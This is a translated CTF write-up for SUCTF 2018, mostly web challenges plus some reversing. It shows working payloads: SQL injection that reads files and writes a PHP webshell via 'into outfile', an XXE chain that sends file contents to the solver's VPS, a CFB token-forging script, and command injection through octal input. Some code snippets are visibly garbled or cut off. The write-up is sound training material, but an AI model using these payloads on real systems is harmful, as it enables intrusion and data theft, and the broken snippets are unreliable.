# SUCTF WriteUP
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
SUCTF题目docker镜像:
> suctf/2018-web-multi_sql  
>  suctf/2018-web-homework  
>  suctf/2018-web-hateit  
>  suctf/2018-web-getshell  
>  suctf/2018-web-annonymous  
>  suctf/2018-pwn-note  
>  suctf/2018-pwn-noend  
>  suctf/2018-pwn-lock2  
>  suctf/2018-pwn-heapprint  
>  suctf/2018-pwn-heap  
>  suctf/2018-misc-padding  
>  suctf/2018-misc-game  
>  suctf/2018-misc-rsagood  
>  suctf/2018-misc-rsa  
>  suctf/2018-misc-enjoy  
>  suctf/2018-misc-pass  
>  下面的exp中，许多地址使用的是出题人的本地环境，因此测试时请注意
## WEB
###  Anonymous
这个题目是从HITCON CTF上找到的一个思路，因为有现成的打法，因此这个题目在一开就放了出来。
exp如下：
    import requests
    import socket
    import time
    from multiprocessing.dummy import Pool as ThreadPool
    try:
        requests.packages.urllib3.disable_warnings()
    except:
        pass
    def run(i):
        while 1:
            HOST = '127.0.0.1'
            PORT = 23334
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            s.sendall('GET / HTTP/1.1nHost: localhostnConnection: Keep-Alivenn')
            # s.close()
            print 'ok'
            time.sleep(0.5)
    i = 8
    pool = ThreadPool( i )
    result = pool.map_async( run, range(i) ).get(0xffff)
###  Getshell
  * 题目过滤了大多数可见字符，为了给大家写shell，从第六位开始过滤字符，过滤字符可以Fuzz。
  * 可以写入的字符有~ $ _ ; = ( )
  * 所以考虑取反符~和不可见字符写shell。
  * 编码ISO-8859-15中可以用~进行取反生成所需字符
  * payload因为编码问题显示不出来,一句话马参考payload.php文件，密码_
  * 参考文章[传送门](http://www.hack80.com/forum.php?mod=viewthread&tid=46962&extra=page%3D1)
####  注意问题
  * 单纯的文件中写入payload，是无法正常执行的，因为文件的编码需要保存成ISO-8859-15
  * 先讲文件编码改成ISO-8859-15，再写入paylaod，不然在保存payload时有可能会改变不可见字符编码。
###  MultiSql
  * [http://127.0.0.1:8088/user/user.php?id=6^(if(ascii(mid(user(),1,1))>0,0,1](http://127.0.0.1:8088/user/user.php?id=6%5E\(if\(ascii\(mid\(user\(\),1,1\)\)>0,0,1))) 存在注入（过滤了union、select、&、|….）
  * 注入得到root用户，尝试读文件
>
> [http://127.0.0.1:8088/user/user.php?id=6^(if(ascii(mid(load_file(0x2F7661722F7777772F68746D6C2F696E6465782E706870),1,2))>1,0,1](http://127.0.0.1:8088/user/user.php?id=6%5E\(if\(ascii\(mid\(load_file\(0x2F7661722F7777772F68746D6C2F696E6465782E706870\),1,2\)\)>1,0,1)))
  * 在/var/www/html/user/user.php中发现是用mysqli_multi_query()函数进行sql语句查询的，可以多语句执行
  * /var/www/html//bwvs_config/waf.php添加了魔术引号函数
  * 为了绕过单双引号，使用mysql的预处理语句：
> set [@sql](https://github.com/sql "@sql") = concat(‘create table ‘,newT,’
> like ‘,old);  
>  prepare s1 from [@sql](https://github.com/sql "@sql");  
>  execute s1;
  * 将`select '' into outfile '/var/www/html/favicon/1.php';`语句编码: 
        set [@s](https://github.com/s "@s")=concat(CHAR(115),CHAR(101),CHAR(108),CHAR(101),CHAR(99),CHAR(116),CHAR(32),CHAR(39),CHAR(60),CHAR(63),CHAR(112),CHAR(104),CHAR(112),CHAR(32),CHAR(112),CHAR(104),CHAR(112),CHAR(105),CHAR(110),CHAR(102),CHAR(111),CHAR(40),CHAR(41),CHAR(59),CHAR(63),CHAR(62),CHAR(39),CHAR(32),CHAR(105),CHAR(110),CHAR(116),CHAR(111),CHAR(32),CHAR(111),CHAR(117),CHAR(116),CHAR(102),CHAR(105),CHAR(108),CHAR(101),CHAR(32),CHAR(39),CHAR(47),CHAR(118),CHAR(97),CHAR(114),CHAR(47),CHAR(119),CHAR(119),CHAR(119),CHAR(47),CHAR(104),CHAR(116),CHAR(109),CHAR(108),CHAR(47),CHAR(102),CHAR(97),CHAR(118),CHAR(105),CHAR(99),CHAR(111),CHAR(110),CHAR(47),CHAR(49),CHAR(46),CHAR(112),CHAR(104),CHAR(112),CHAR(39),CHAR(59));
    PREPARE s2 FROM [@s](https://github.com/s "@s");
    EXECUTE s2;
  * 经shell写到
###  Homework
  * 注册账号，登录作业平台。看到一个calc计算器类。有两个按钮，一个用于调用calc类实现两位数的四则运算。另一个用于提交代码。
  * XXE注入  
点击calc按钮，计算2+2得到结果为4。
根据url结合calc源码可得到，module为调用的类，args为类的构造方法的参数。在PHP中存在内置类。其中包括SimpleXMLElement，文档中对于`SimpleXMLElement::__construct`定义如下:
可以看到通过设置第三个参数为true，可实现远程xml文件载入。第二个参数的常量值我们设置为2即可。第二个参数可定义的所有常量在[这里](http://php.net/manual/zh/libxml.constants.php)。第一个参数就是我们自己设置的payload的地址，用于引入外部实体。
在自己的vps上构造obj.xml文件：
    %int;  
    %all;  
    %send;  
    ]>
evil.xml代码如下:
    ">
1.php代码：
        $content=$_GET['file'];
        file_put_contents("content.txt",$content);
构造payload如下：
    http://target:8888/show.php?module=SimpleXMLElement&args[]=http://vps/XXE/obj.xml&args[]=2&args[]=true
在自己的vps上查看content.txt即可看到base64编码后的index.php的源码。但是并不是完整的代码。需要将所有base64编码以空格或斜杠分割。逐一进行base64解码，拼接在一起才是完整的源码。我的解码脚本如下：
    $source="base64 code";
    $sour=explode(" ",$source);
    $code="";
    foreach($sour as $value){
        if(strpos("/",$value)){
            $v=explode("/",$value);
            foreach($v as $v1){
                echo base64_decode($v1)."rn";
            }
            continue;
        }
        echo base64_decode($value)."rn";
    }
通过`SimpleXMLElement::__construct`进行文件读取的过程中会导致部分字符的丢失，但是不影响代码的整体阅读。所以在通过脚本解码之后，会有部分字符丢失。还有一点需要特别注意的是，通过这种方式读取的文件大小一般不能超过3kb。否则会读取失败，正是因为这个原因，我才把login拆分成login.php和login_p.php。
通过同样的方式，读取所有源码。下载下来后进行代码审计。
  * 代码审计——sql注入
可以看到在submit.php中调用upload_file()函数。跟进function中的upload_file，可以看到将我们上传的文件的文件名及随机生成的md5值还有一个随机数sig存入数据库。文件名有过滤，在无0day的情况下无法绕过。文件名不可控，唯一的可控点就是通过post提交的sig。
通过审计可以看出来，在文件上传处存在一个二次注入。在文件上传时设置sig为十六进制数据，将sql语句注入数据库。在show.php页面触发。
但是show.php页面的查看源码功能只有本地用户才可访问。因此我们还需要寻找一个ssrf进行访问。由于代码中有sql的报错回显，所以我们可以继续使用`SimpleXMLElement::__construct`读取回显内容。
首先在submit.php上传任意文件。在上传前修改html中sig的value值即可。
这里的数据是`'||extractvalue(1,concat(0x7e,(select
@[@version](https://github.com/version
"@version")),0x7e))||'`的十六进制编码。接下来修改evil.xml文件如下：
    ">
利用`SimpleXMLElement::__construct`触发ssrf并读取内容。方法和文件读取相同，exp如下：
    http://target/show.php?module=SimpleXMLElement&args[]=http://vps/XXE/obj.xml&args[]=2&args[]=true
在content.txt中就可以看到报错注入的回显信息的base64编码，用上面的解码脚本跑一下就行。
最后getflag的exp如下：
    ascii：'||extractvalue(1,concat(0x7e,(select flag from flag),0x7e))||'
    hex：0x277C7C6578747261637476616C756528312C636F6E63617428307837652C2873656C65637420666C61672066726F6D20666C6167292C3078376529297C7C27
###  HateIT
首先发现有.git文件夹存在，于是拿githack还原了下，发现一个readme，读完之后，发现有历史版本存在，查看网站的.git文件发现有标签，结合readme，猜测源码在标签里，于是写脚本还原。
还原之后发现一些php文件和opcode,通过opcode还原代码，而其他文件无法打开，在robots.txt里面发现一个so文件，结合readme推断出php文件是使用so文件加密过的，通过逆向so文件还原出源代码，开始代码审计。
打开之后理了遍流程，发现是通过输入的用户名进行加密，获得sign和token，加密方法使用的是cfb，然后再往下就是将token解密，将解密的结果通过 |
进行分割，并取第二个参数进行判断admin，但是通过阅读代码，可以发现正常流程下，是无法通过判断的。
观察加密流程，func.php里面有两个加密函数，两个解密函数，其中一组是aes-128-cbc，一组是cfb，但是cbc的加密解密并未使用。
这里的加密我写的有问题，很多选手直接伪造第二个参数为3就绕过了检查，使得整个题目的难度降了一级，然而我本意是想考一波CFB的重放攻击的，非常的可惜，但是自己写出来的洞，跪着也要担着，所以接下来的思路，我还是以CFB为主。
于是看一下加密流程，先是将
`$user|$admin|$md5`进行加密，然后放入session，但是后面会将session输出，因此我们可以获得自己的token和sign。
因此我们需要伪造session来通过判断。对于token的加密使用的是cfb，  
cfb是使用的分组加密，因此我们需要传入token值，使得其解密后的token[1]的值为2，能看到，程序中使用的是int函数进行转换，这里就涉及到了php的弱类型问题，原先的token组成为：
> $token = $user|$admin|$md5
先拓展token长度
> $token = $user|$admin|$md5$user|$admin|$md5
再将第一段`$admin|$md5`部分与2异或，这样最终的第二段的解密结果以2开头，后续的数据被破坏，尽管 |
还是有三个，但是cfb是密文分组参与异或，因此第二段的错误会引起第三段16位一组的密文分组错误。
CFB攻击的脚本如下:
    plain = "meizimeizimeizi|0|xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx0ex0ex0ex0ex0ex0ex0ex0ex0ex0ex0ex0ex0ex0e"
    token = "32b85d5f397d51156d2bc0cca7851cb8ba1bda625324964543d56974057bede0b886428015f9c6544269d81ed6450f8fe7dacebfabcc1ea1270a225d4ac90163"
    raw_token = token.decode("hex")
    print len(raw_token)
    print len(plain)
    fake_token = list(raw_token)
    temp = fake_token[-64:]
    fake_token[16] = chr(ord(raw_token[16]) ^ ord(plain[16]) ^ ord("3"))
    fake_token = fake_token + temp
    fake_token = "".join(fake_token).encode("hex")
    print fake_token
此时便绕过了第一个admin部分的检查。
再阅读源码，发现在class.php中，有个system函数，而system函数的参数是从get传参的，而其验证只允许和数字，因此可以使用八进制传输命令。
因此直接`admin.php?action=viewImage&size=7315416373`，即:`;ls;`，即可执行ls命令.然后`cat
flag`的位置即可。
## Reverse
###  babyre
mips题目，简单的base64变形解码，替换了base64置换表
    #!/usr/bin/env python2
    #-*- coding:utf-8 -*-    
    base64list = 'R9Ly6NoJvsIPnWhETYtHe4Sdl+MbGujaZpk102wKCr7/0Dg5zXAFqQfxBicV3m8U'
    cipherlist = "eQ4y46+VufZzdFNFdx0zudsa+yY0+J2m"
    length=len(cipherlist)
    print length
    group=length/4
    s=''
    string=''
    for i in range(group-1):
        j=i*4
        s=cipherlist[j:j+4]
        string+=chr(((base64list.index(s[0]))>4))
        string+=chr(((base64list.index(s[1]) & 0x0f)>2))
        string+=chr(((base64list.index(s[2]) & 0x03)>4))
    if s[2]=='=':
        print string
    else:
        string+=chr(((base64list.index(s[1]) & 0x0f)>2))
    if s[3]=='=':
        print string
    else:
        string+=chr(((base64list.index(s[2]) & 0x03) "====="
    printf("%0*d", 20, 0) => "00000000000000000000"
配合上`$`参数，就可以把指定参数设定为宽度，题目中`%1$*2$s`就是将第一个参数以第二个参数的宽度输出。那么，输出完`%1$*2$s`的串之后，当前输出长度即为第二个参数。下面又会再遇到一个`%1$*2$s`，那当前输出长度即为
**2倍的第二个参数** 。接下来每遇到一个这样的格式串，都会 **累加** 一次当前输出长度。
加上最后的`%20$n`这个格式串， **将累加结果写入最后一个参数** ，程序的功能就很明显了。这实际上是一个 **线性方程组**
的问题，利用`printf`来实现元素的求和。
Z3，启动！
// 然而出题人并没有写脚本，不过参数提取出来，解一下应该很快的吧 = =
    SUCTF{s1mpl3_prin7f_l1near_f0rmulas}
// 话说一开始想实现一点复杂的运算的，最后时间关系只能选择线性方程组。以后有机会我会探究一下printf如何优秀地实现除了加减法以外的运算。
###  RoughLike与期末大作业
运行游戏，提示说有TWO SPELL 帮助你逃出迷宫。  
找到Assembly-CSharp.dll文件，运行游戏，找到一个和flag有关的函数:
    // Token: 0x06000193 RID: 403 RVA: 0x000110AC File Offset: 0x0000F2AC
    private void LayoutObjectAtRandom_Flag(List S3cretArray, int minimum, int maximum)
    ......
        case 5:
        {
            vector3 position = this.randomposition();
            gameobject tile = s3cretarray[0].tile;
            unityengine.object.instantiate(tile, position, quaternion.identity);
            num = 0;
            continue;
        }
看到这个s3cretarray之后，确定方向，要么让这个逻辑执行，要么直接找到这个s3cretarray[0].tile对象是啥。这里直接修改逻辑，将两个几乎不可能完成的逻辑修改:
        case 3:
            if (GameManager.instance.playerFoodPoints != Decrypt.oro_1(59648))
            {
                num = 5;